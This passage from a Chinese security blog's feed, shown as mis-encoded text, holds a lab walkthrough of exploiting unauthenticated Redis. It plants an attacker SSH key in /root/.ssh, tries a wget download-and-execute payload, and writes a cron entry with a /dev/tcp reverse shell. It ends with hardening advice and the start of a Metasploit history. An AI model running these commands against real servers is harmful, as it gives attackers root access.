è®¤è¯ç™»å½•çš„æ–¹å¼åº”è¯¥ä¸ä¼šæœ‰.sshçš„ç›®å½•ã€‚æ­£ç¡®çš„è¯´æ³•åº”è¯¥æ˜¯ç›®æ ‡æœºå™¨é…ç½®è¿‡é€šè¿‡sshå…¬ç§å¯†é’¥ç™»å½•ä¹‹åæ‰ä¼šå­˜åœ¨.sshæ–‡ä»¶ï¼Œå…·ä½“æ“ä½œè§æœ¬ç«™ã€ŠsshæœåŠ¡å…¬ç§é’¥è®¤è¯ã€‹ä¸€æ–‡ã€‚</p><h4 id="3ï¼‰åŸç†"><a href="#3ï¼‰åŸç†" class="headerlink" title="3ï¼‰åŸç†"></a>3ï¼‰åŸç†</h4><p>åŸç†å°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalueï¼Œkeyå€¼å¯ä»¥éšæ„è®¾ç½®ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized_keysï¼ŒæŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿæˆä¸€ä¸ªæˆæƒçš„keyã€‚</p><h4 id="4ï¼‰kaliç”Ÿæˆå…¬ç§é’¥å¯¹ï¼ˆå¦‚æœæœ¬èº«å°±æœ‰å¯ä»¥ä¸ç”Ÿæˆï¼‰"><a href="#4ï¼‰kaliç”Ÿæˆå…¬ç§é’¥å¯¹ï¼ˆå¦‚æœæœ¬èº«å°±æœ‰å¯ä»¥ä¸ç”Ÿæˆï¼‰" class="headerlink" title="4ï¼‰kaliç”Ÿæˆå…¬ç§é’¥å¯¹ï¼ˆå¦‚æœæœ¬èº«å°±æœ‰å¯ä»¥ä¸ç”Ÿæˆï¼‰"></a>4ï¼‰kaliç”Ÿæˆå…¬ç§é’¥å¯¹ï¼ˆå¦‚æœæœ¬èº«å°±æœ‰å¯ä»¥ä¸ç”Ÿæˆï¼‰</h4><p>å¦‚æœæ²¡æœ‰å¯ä»¥ç”¨å¦‚ä¸‹æ–¹æ³•ç”Ÿæˆä¸€å¯¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>ssh-keygen</code> æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆ SSH å¯†é’¥å¯¹çš„å‘½ä»¤è¡Œå·¥å…·ã€‚å½“ä½ è¿è¡Œ <code>ssh-keygen -t rsa</code> å‘½ä»¤æ—¶ï¼Œå®ƒä¼šåˆ›å»ºä¸€å¯¹æ–°çš„ RSA å¯†é’¥ï¼ŒåŒ…æ‹¬ä¸€ä¸ªç§é’¥å’Œä¸€ä¸ªå…¬é’¥ã€‚ä»¥ä¸‹æ˜¯è¯¥å‘½ä»¤çš„è¯¦ç»†è§£é‡Šå’Œä½¿ç”¨æ­¥éª¤ï¼š</p><p>å‘½ä»¤è§£é‡Š</p><ul><li><code>ssh-keygen</code>ï¼šè¿™æ˜¯ç”Ÿæˆã€ç®¡ç†å’Œè½¬æ¢è®¤è¯å¯†é’¥çš„å‘½ä»¤ã€‚</li><li><code>-t rsa</code>ï¼šè¿™ä¸ªé€‰é¡¹æŒ‡å®šäº†å¯†é’¥çš„ç±»å‹ã€‚åœ¨è¿™é‡Œï¼Œ<code>rsa</code> è¡¨ç¤ºä½¿ç”¨ RSA åŠ å¯†ç®—æ³•ç”Ÿæˆå¯†é’¥å¯¹ã€‚</li></ul></blockquote><h4 id="5ï¼‰å°†å…¬é’¥å†™å…¥key-txtæ–‡ä»¶"><a href="#5ï¼‰å°†å…¬é’¥å†™å…¥key-txtæ–‡ä»¶" class="headerlink" title="5ï¼‰å°†å…¬é’¥å†™å…¥key.txtæ–‡ä»¶"></a>5ï¼‰å°†å…¬é’¥å†™å…¥key.txtæ–‡ä»¶</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span><span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> key.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>echoçš„-eå‚æ•°ï¼š</p><p><code>-e</code> å‚æ•°æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„é€‰é¡¹ï¼Œå®ƒå…è®¸ <code>echo</code> å‘½ä»¤è§£é‡Šä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦å’Œè½¬ä¹‰åºåˆ—ã€‚è¿™äº›è½¬ä¹‰åºåˆ—å¯ä»¥æ§åˆ¶æ–‡æœ¬çš„æ ¼å¼ï¼Œå¦‚æ¢è¡Œã€åˆ¶è¡¨ç¬¦ã€å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“æŸç­‰ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€äº›ä¸ <code>-e</code> å‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶æœ‰æ•ˆçš„è½¬ä¹‰åºåˆ—ï¼š</p><ul><li><code>\n</code>ï¼šæ¢è¡Œç¬¦ï¼Œç”¨äºåœ¨è¾“å‡ºä¸­åˆ›å»ºä¸€ä¸ªæ–°è¡Œã€‚</li><li><code>\t</code>ï¼šåˆ¶è¡¨ç¬¦ï¼ˆæ°´å¹³åˆ¶è¡¨ç¬¦ï¼‰ï¼Œç”¨äºåœ¨è¾“å‡ºä¸­åˆ›å»ºä¸€ä¸ªæ°´å¹³åˆ¶è¡¨ã€‚</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Hello,<span class="token entity" title="\n">\n</span>World!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªå‘½ä»¤å°†åœ¨ä¸¤è¡Œè¾“å‡º â€œHello,â€ å’Œ â€œWorld!â€ã€‚</p></blockquote><p>ï¼ˆå‰åç”¨\næ¢è¡Œï¼Œé¿å…å’Œredisé‡Œå…¶ä»–ç¼“å­˜æ•°æ®æ··åˆï¼‰ã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.20.04.png" style="zoom:40%;"><h4 id="6ï¼‰æŠŠkey-txtæ–‡ä»¶å†…å®¹å†™å…¥redisç¼“å†²"><a href="#6ï¼‰æŠŠkey-txtæ–‡ä»¶å†…å®¹å†™å…¥redisç¼“å†²" class="headerlink" title="6ï¼‰æŠŠkey.txtæ–‡ä»¶å†…å®¹å†™å…¥redisç¼“å†²"></a>6ï¼‰æŠŠkey.txtæ–‡ä»¶å†…å®¹å†™å…¥redisç¼“å†²</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /root/key.txt <span class="token operator">|</span>./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.52.4 <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>åœ¨ Redis 2.8.17 ç‰ˆæœ¬ä¸­ï¼Œ<code>redis-cli</code> å·¥å…·çš„ <code>-x</code> å‚æ•°ç”¨äºæ‰§è¡Œä¸€ä¸ª Redis å‘½ä»¤ã€‚</p></blockquote><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.36.03.png" style="zoom:50%;"><h4 id="7ï¼‰è®¾ç½®redisçš„dumpæ–‡ä»¶è·¯å¾„ä¸º-root-sshä¸”æ–‡ä»¶åä¸ºauthorized-keys"><a href="#7ï¼‰è®¾ç½®redisçš„dumpæ–‡ä»¶è·¯å¾„ä¸º-root-sshä¸”æ–‡ä»¶åä¸ºauthorized-keys" class="headerlink" title="7ï¼‰è®¾ç½®redisçš„dumpæ–‡ä»¶è·¯å¾„ä¸º/root/.sshä¸”æ–‡ä»¶åä¸ºauthorized_keys"></a>7ï¼‰è®¾ç½®redisçš„dumpæ–‡ä»¶è·¯å¾„ä¸º/root/.sshä¸”æ–‡ä»¶åä¸ºauthorized_keys</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.52.4config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.sshconfig <span class="token builtin class-name">set</span> dbfilename authorized_keyssave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-none"><code class="language-none">config set dir /root/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>è¿™ä¸ªå‘½ä»¤ç”¨äºè®¾ç½® Redis çš„é…ç½®å‚æ•°ã€‚åœ¨è¿™é‡Œï¼Œå®ƒè¯•å›¾å°† Redis çš„æŒä¹…åŒ–æ–‡ä»¶ç›®å½•è®¾ç½®ä¸º <code>/root/.ssh</code>ã€‚</li></ul><pre class="line-numbers language-none"><code class="language-none">config set dbfilename authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>è¿™ä¸ªå‘½ä»¤ä¹Ÿæ˜¯ç”¨äºè®¾ç½® Redis çš„é…ç½®å‚æ•°ã€‚åœ¨è¿™é‡Œï¼Œå®ƒè¯•å›¾å°† Redis æ•°æ®åº“çš„æŒä¹…åŒ–æ–‡ä»¶åè®¾ç½®ä¸º <code>authorized_keys</code>ã€‚</li></ul><p>åœ¨ Redis ä¸­ï¼Œ<code>config set</code> å‘½ä»¤ç”¨äºåœ¨è¿è¡Œæ—¶åŠ¨æ€è®¾ç½®é…ç½®å‚æ•°ã€‚ä»¥ä¸‹æ˜¯ <code>dir</code> å’Œ <code>dbfilename</code> å‚æ•°çš„ä½œç”¨ï¼š</p><ol><li><code>config set dir /path/to/directory</code><ul><li>è¿™ä¸ªå‘½ä»¤ç”¨äºè®¾ç½® Redis æ•°æ®åº“æ–‡ä»¶çš„å­˜å‚¨ç›®å½•ã€‚<code>dir</code> å‚æ•°æŒ‡å®šäº†æŒä¹…åŒ–æ–‡ä»¶ï¼ˆå¦‚ RDB å¿«ç…§ï¼‰çš„ä¿å­˜è·¯å¾„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒRedis ä¼šå°†æ•°æ®æ–‡ä»¶ä¿å­˜åœ¨å½“å‰å·¥ä½œç›®å½•ä¸‹ï¼Œä½†ä¸ºäº†æ•°æ®å®‰å…¨ï¼Œå»ºè®®æ˜¾å¼è®¾ç½®ä¸€ä¸ªä¸“é—¨çš„ç›®å½•æ¥å­˜å‚¨è¿™äº›æ–‡ä»¶ã€‚é€šè¿‡ä¿®æ”¹ <code>dir</code> å‚æ•°ï¼Œä½ å¯ä»¥æŒ‡å®šä¸€ä¸ªä¸åŒçš„è·¯å¾„æ¥å­˜æ”¾è¿™äº›æŒä¹…åŒ–æ–‡ä»¶ï¼Œä»¥é¿å…è¯¯åˆ é™¤æˆ–æ•°æ®ä¸¢å¤±çš„é£é™©ã€‚</li></ul></li><li><code>config set dbfilename filename</code><ul><li>è¿™ä¸ªå‘½ä»¤ç”¨äºè®¾ç½® Redis æ•°æ®åº“çš„æŒä¹…åŒ–æ–‡ä»¶åã€‚<code>dbfilename</code> å‚æ•°æŒ‡å®šäº† RDB å¿«ç…§æ–‡ä»¶çš„åç§°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ–‡ä»¶åæ˜¯ <code>dump.rdb</code>ã€‚é€šè¿‡ä¿®æ”¹ <code>dbfilename</code> å‚æ•°ï¼Œä½ å¯ä»¥ä¸º RDB å¿«ç…§æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„æ–‡ä»¶åã€‚è¿™åœ¨ç®¡ç†å¤šä¸ª Redis å®ä¾‹æˆ–éœ€è¦åŒºåˆ†ä¸åŒæ•°æ®åº“å¿«ç…§æ—¶éå¸¸æœ‰ç”¨ã€‚</li></ul></li></ol></blockquote><p>è¿™é‡Œå…ˆå°†æ”»å‡»è€…çš„å…¬é’¥ä¿å­˜åˆ°ç¼“å†²åŒºï¼Œç„¶åè®¾ç½®æ•°æ®åº“æ–‡ä»¶ï¼Œ<code>SAVE</code> å‘½ä»¤ç”¨äºåˆ›å»ºå½“å‰æ•°æ®åº“çš„å¿«ç…§å¹¶ä¿å­˜åˆ°ç£ç›˜ä¸Šçš„ RDB æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œå°±æ˜¯æŠŠç¼“å†²åŒºä¸­çš„æ•°æ®åˆ·åˆ°äº†/root/.ssh/authorized_keysä¸­ã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.39.05.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.43.13.png" alt="é¶æœºçš„sshå…¬é’¥å·²ç»è¢«ç¯¡æ”¹" style="zoom:50%;"><h4 id="8ï¼‰æˆåŠŸè·å¾—rootæƒé™çš„ssh-shell"><a href="#8ï¼‰æˆåŠŸè·å¾—rootæƒé™çš„ssh-shell" class="headerlink" title="8ï¼‰æˆåŠŸè·å¾—rootæƒé™çš„ssh shell"></a>8ï¼‰æˆåŠŸè·å¾—rootæƒé™çš„ssh shell</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-i</span> ~/.ssh/id_rsa root@192.168.52.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>-i ~/.ssh/id_rsa</code>ï¼šè¿™ä¸ªé€‰é¡¹æŒ‡å®šäº†ç”¨äºè®¤è¯çš„ç§é’¥æ–‡ä»¶ã€‚<code>-i</code> ä»£è¡¨ identity fileï¼Œå³èº«ä»½æ–‡ä»¶ï¼Œ<code>~/.ssh/id_rsa</code> æ˜¯ç§é’¥æ–‡ä»¶çš„è·¯å¾„ã€‚</p></blockquote><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.44.08.png" style="zoom:40%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.44.57.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token number">192.168</span>.52.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.03.26.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@192.168.52.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.04.15.png" style="zoom:50%;"><p>æˆåŠŸè·å¾—rootæƒé™çš„ssh shellã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2016.58.20.png" a="" style="zoom:50%;"><p>çœŸå®çš„rootç”¨æˆ·ç™»å½•æ—¶éœ€è¦è¾“å…¥å¯†ç è®¤è¯ï¼Œå› ä¸ºæ­¤æ—¶æœåŠ¡å™¨çš„sshå…¬é’¥å·²ç»è¢«ç¯¡æ”¹ä¸ºæ”»å‡»è€…çš„å…¬é’¥äº†ã€‚</p><h3 id="2-3-3-åå¼¹shellä¸Šçº¿metepreterï¼ˆå¤±è´¥ï¼‰"><a href="#2-3-3-åå¼¹shellä¸Šçº¿metepreterï¼ˆå¤±è´¥ï¼‰" class="headerlink" title="2.3.3 åå¼¹shellä¸Šçº¿metepreterï¼ˆå¤±è´¥ï¼‰"></a>2.3.3 åå¼¹shellä¸Šçº¿metepreterï¼ˆå¤±è´¥ï¼‰</h3><ul><li>msfæ„å»ºpayloadï¼Œå‚æ•°è®¾ç½®æƒ…å†µå¦‚ä¸‹</li></ul><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.31.32.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.32.26.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-qO</span> sbWGQnnZ --no-check-certificate http://192.168.52.6:8080/YrdRCeRQ<span class="token punctuation">;</span> <span class="token function">chmod</span> +x sbWGQnnZ<span class="token punctuation">;</span> ./sbWGQnnZ<span class="token operator">&amp;</span> disown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.35.50.png" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.36.22.png" style="zoom:50%;"><p>ä½†æ˜¯å†™å…¥çš„æ•°æ®æœ‰ä¹±ç ï¼Œæ— æ³•æ‰§è¡Œã€‚</p><p>æš‚æ—¶æƒ³ä¸åˆ°ä»€ä¹ˆæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</p><h3 id="2-3-4-æ™®é€šåå¼¹æ™®é€šshell"><a href="#2-3-4-æ™®é€šåå¼¹æ™®é€šshell" class="headerlink" title="2.3.4 æ™®é€šåå¼¹æ™®é€šshell"></a>2.3.4 æ™®é€šåå¼¹æ™®é€šshell</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.52.4config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cronconfig <span class="token builtin class-name">set</span> dbfilename root<span class="token builtin class-name">set</span> hahaha <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.52.4/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.26.21.png" alt="æˆªå±2025-01-08 17.26.21" style="zoom:50%;"><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.25.43.png" style="zoom:50%;"><p>æœåŠ¡å™¨åŸæ¥cronç›®å½•ä¸‹æ²¡æœ‰rootæ–‡ä»¶çš„ï¼Œç°åœ¨æœ‰äº†ï¼Œå¹¶ä¸”å†…å®¹æ˜¯redisçš„ç¼“å­˜ï¼Œæœ‰è„æ•°æ®ã€‚</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.27.20.png" style="zoom:40%;"><blockquote><p>å¦‚æœæƒ³æ¸…é™¤ä¸€ä¸‹ç¼“å­˜ä¸­ä¹‹å‰å†™å…¥çš„è„æ•°æ®ï¼š</p><p>å¯ä»¥æ‰§è¡ŒFLUSHDBæˆ–FLUSHALLï¼š</p><p><code>FLUSHDB</code>ï¼šè¿™ä¸ªå‘½ä»¤ä¼šåˆ é™¤å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰é”®ã€‚å¦‚æœåœ¨ Redis é…ç½®ä¸­å¯ç”¨äº† <code>save</code> é€‰é¡¹ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œ <code>FLUSHDB</code> å‘½ä»¤åï¼ŒRedis ä¼šå¼‚æ­¥åœ°å°†è¿™ä¸ªçŠ¶æ€ä¿å­˜åˆ°ç£ç›˜ã€‚</p><p><code>FLUSHALL</code>ï¼šè¿™ä¸ªå‘½ä»¤ä¼šåˆ é™¤æ‰€æœ‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰é”®ã€‚ä¸ <code>FLUSHDB</code> ç±»ä¼¼ï¼Œå¦‚æœå¯ç”¨äº†æŒä¹…åŒ–ï¼Œè¿™ä¸ªå‘½ä»¤ä¹Ÿä¼šè§¦å‘ä¿å­˜æ“ä½œã€‚</p><p>æ‰§è¡Œä¹‹åå¯ä»¥saveä¸€ä¸‹ä¿å­˜æ›´æ”¹ã€‚</p></blockquote><p>è¿™é‡Œçš„å®šæ—¶ä»»åŠ¡ä¼šæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚</p><p>æ”»å‡»ç«¯kaliç›‘å¬8888ç«¯å£ï¼ŒæˆåŠŸè·å–åˆ°rootæƒé™çš„shell</p><img src="/2025/01/08/lou-dong-zhi-shi-ku/redis-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2025-01-08%2017.27.54.png" style="zoom:40%;"><h1 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h1><p>åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™ã€‚</p><p>é˜²èŒƒæªæ–½ï¼š</p><ul><li><strong>è®¾ç½®å¯†ç è®¤è¯</strong>ï¼šåœ¨Redisé…ç½®æ–‡ä»¶<code>redis.conf</code>ä¸­è®¾ç½®å¼ºå¯†ç ï¼Œå¹¶å¯ç”¨è®¤è¯åŠŸèƒ½ã€‚</li><li><strong>é™åˆ¶è®¿é—®</strong>ï¼šé€šè¿‡é˜²ç«å¢™è§„åˆ™é™åˆ¶Redisç«¯å£çš„è®¿é—®ï¼Œåªå…è®¸ä¿¡ä»»çš„IPåœ°å€è®¿é—®ã€‚</li><li><strong>ç»‘å®šæœ¬åœ°æ¥å£</strong>ï¼šå°†Redisç»‘å®šåœ¨æœ¬åœ°æ¥å£ï¼ˆå¦‚127.0.0.1ï¼‰ï¼Œé¿å…æš´éœ²åœ¨å…¬ç½‘ä¸Šã€‚</li><li><strong>å®šæœŸæ›´æ–°</strong>ï¼šåŠæ—¶æ›´æ–°Redisåˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œä»¥ä¿®å¤å·²çŸ¥çš„å®‰å…¨æ¼æ´ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> redisæœªæˆæƒè®¿é—® </tag>
            
            <tag> æœªæˆæƒè®¿é—® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF-Metasploit</title>
      <link href="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/"/>
      <url>/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Metasploit-ç®€ä»‹"><a href="#ä¸€ã€Metasploit-ç®€ä»‹" class="headerlink" title="ä¸€ã€Metasploit ç®€ä»‹"></a>ä¸€ã€Metasploit ç®€ä»‹</h1><p>Metasploit æ˜¯ä¸€ä¸ªå¼€æºçš„æ¸—é€æµ‹è¯•å¼€æºè½¯ä»¶ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªé€æ­¥å‘å±•æˆç†Ÿçš„æ¼æ´ç ”ç©¶ä¸æ¸—é€æµ‹è¯•ä»£ç å¼€å‘å¹³å°ï¼ˆå¯æ‰©å±•ï¼‰ï¼Œæ­¤å¤–ä¹Ÿå°†æˆä¸ºæ”¯æŒæ•´ä¸ªæ¸—é€æµ‹è¯•è¿‡ç¨‹çš„å®‰å…¨æŠ€æœ¯é›†æˆå¼€å‘ä¸åº”ç”¨ç¯å¢ƒã€‚</p><h1 id="äºŒã€è¯ç”Ÿä¸å‘å±•"><a href="#äºŒã€è¯ç”Ÿä¸å‘å±•" class="headerlink" title="äºŒã€è¯ç”Ÿä¸å‘å±•"></a>äºŒã€è¯ç”Ÿä¸å‘å±•</h1><p>Metasploit é¡¹ç›®æœ€åˆæ˜¯ç”±HD Moore åœ¨2003 å¹´å¤å­£åˆ›ç«‹ï¼Œç›®æ ‡æ˜¯æˆä¸ºæ¸—é€æ”»å‡»ç ”ç©¶ä¸ä»£ç å¼€å‘çš„ä¸€ä¸ªå¼€æ”¾èµ„æºã€‚HD Mooreåœ¨2003 å¹´çš„10æœˆå‘å¸ƒäº†ä»–çš„ç¬¬ä¸€ä¸ªåŸºäºPerl è¯­è¨€(pl)çš„Metasploit ç‰ˆæœ¬ï¼Œå½“æ—¶ä¸€å…±é›†æˆäº†11ä¸ªæ¸—é€æ”»å‡»æ¨¡å—ã€‚åœ¨Spoonm çš„å¸®åŠ©ä¸‹ï¼Œå®Œå…¨é‡å†™äº†Metasploit çš„ä»£ç ï¼Œå¹¶åœ¨2004 å¹´4æœˆå‘å¸ƒäº†Metasploit v2.0ï¼Œç‰ˆæœ¬ä¸­å·²ç»åŒ…å«äº†18ä¸ªæ¸—é€æ”»å‡»æ¨¡å—å’Œ27 ä¸ªæ”»å‡»è½½è·ï¼ˆpayloadï¼‰ï¼Œå¹¶æä¾›äº†æ§åˆ¶å°ç»ˆç«¯ï¼Œå‘½ä»¤è¡Œå’ŒWeb ä¸‰ä¸ªä½¿ç”¨æ¥å£ã€‚</p><p>åœ¨2004 å¹´8æœˆï¼ŒHD å’ŒSpoonm å¸¦ç€æœ€æ–°å‘å¸ƒçš„Metasploit v2.2 å¹¶åœ¨æ‹‰æ–¯ç»´åŠ æ–¯ä¸¾åŠçš„BlackHat å…¨çƒé»‘å®¢å¤§ä¼šä¸Šè¿›è¡Œäº†æ¼”è®²ã€‚å¬ä¼—è¢«Metasploit çš„å¼ºå¤§ä¹‹å¤„æ‰€æŠ˜æœï¼Œå¹¶ä¸€è‡´è®¤ä¸ºï¼šMetasploit æ—¶ä»£å·²ç»åˆ°æ¥ã€‚æ›´å¤šçš„é»‘å®¢åŠ å…¥Metasploit æ ¸å¿ƒå¼€å‘å›¢é˜Ÿä¸è´¡çŒ®æ¸—é€æ”» å‡»ã€è½½è·ä¸è¾…åŠ©æ¨¡å—ä»£ç ã€‚</p><p>åœ¨2005 å¹´çš„CanSecWest é»‘å®¢ä¼šè®®ä¸Šï¼ŒHD å’ŒSpoonm æŒ‡å‡ºäº†Metasploit v2 ä½“ç³»æ¡†æ¶ä¸­çš„ä¸€äº›éš¾ä»¥è§£å†³çš„éš¾é¢˜ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li><p>ç¼ºä¹è·¨å¹³å°æ”¯æŒï¼Œç‰¹åˆ«æ˜¯ä¸èƒ½å¾ˆå¥½åœ°è¿è¡Œåœ¨Windows ç³»ç»Ÿä¸Šã€‚</p></li><li><p>å¾ˆéš¾æ”¯æŒè‡ªåŠ¨åŒ–æ¸—é€æ”»å‡»è¿‡ç¨‹</p></li><li><p>Perl è¯­è¨€çš„å¤æ‚æ€§å’Œç¼ºç‚¹ä½¿å¾—å¤–éƒ¨è´¡çŒ®è€…ä¸ç”¨æˆ·è§„æ¨¡å¢é•¿ä¸ç›¸é€‚åº”</p></li><li><p>Perl è¯­è¨€å¯¹ä¸€äº›å¤æ‚ç‰¹æ€§çš„æ”¯æŒèƒ½åŠ›è¾ƒå¼±ç­‰ã€‚</p></li></ul><p>è€Œä¸”v2 ç‰ˆæœ¬æ˜¯å®Œå…¨å›´ç»•ç€æ¸—é€æ”»å‡»è€Œè®¾è®¡çš„ï¼Œå¯¹ä¿¡æ¯æœé›†ä¸åæ¸—é€æ”»å‡»é˜¶æ®µæ— æ³•æä¾›æœ‰æ•ˆæ”¯æŒã€‚ç»è¿‡18ä¸ªæœˆçš„æ—¶é—´ï¼ŒMetasploit å›¢é˜Ÿä½¿ç”¨Ruby è¯­è¨€å®Œå…¨é‡å†™äº†Metasploit ï¼Œå¹¶åœ¨2007 å¹´5æœˆå‘å¸ƒäº†v3.0 ç‰ˆæœ¬ï¼Œå…¶ä¸­åŒ…å«177 ä¸ªæ¸—é€æ”»å‡»æ¨¡å—ã€104 